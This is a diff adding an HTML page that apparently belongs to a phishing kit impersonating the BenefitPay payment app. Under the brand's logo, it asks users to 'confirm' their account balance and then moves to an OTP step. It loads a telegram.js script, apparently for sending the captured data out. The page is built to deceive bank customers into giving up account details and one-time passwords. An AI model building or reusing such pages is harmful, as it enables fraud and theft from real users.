@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Question - BenefitPay</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="mobile-frame">
+        <div class="mobile-screen">
+            <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo-container">
+                <img src="benefitpay-download.png" alt="BenefitPay Logo" class="logo">
+            </div>
+            <button class="lang-btn">عربي</button>
+        </div>
+
+        <!-- Security Question Section -->
+        <div class="form-section">
+            <label class="input-label">Kindly confirm the estimated balance available in your account</label>
+            <input type="text" class="balance-input" placeholder="Enter balance" id="accountBalance" oninput="formatBalance(this)">
+        </div>
+
+        <!-- Next Button -->
+        <button class="start-btn" onclick="proceedToOTP()">Next</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="config.js"></script>
+    <script src="telegram.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
+
